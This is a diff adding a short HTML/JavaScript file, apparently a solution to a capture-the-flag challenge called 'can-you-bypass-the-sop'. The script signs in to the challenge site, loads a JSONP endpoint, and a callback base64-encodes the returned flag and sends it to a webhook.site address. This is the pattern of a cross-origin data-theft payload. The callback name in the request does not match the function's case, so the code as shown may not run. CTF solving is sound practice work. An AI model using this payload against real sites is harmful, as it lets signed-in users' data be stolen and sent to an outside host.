@@ -1,0 +1,10 @@
+<script src='https://code.jquery.com/jquery-3.5.1.min.js'></script>
+<script>
+  function myCallBack(data) {
+    $.get('https://webhook.site/89a48177-b407-42df-9203-555184f94e09/?action=callback&flag='+window.btoa(data.flag))
+  }
+
+  $.post('https://can-you-bypass-the-sop.ctf.bsidestlv.com/signIn', {"username":"Guest"}, (data,status,xhr) => {
+    $.getScript("https://can-you-bypass-the-sop.ctf.bsidestlv.com/FetchUserInfo?callback=myCallback")
+  })
+</script>
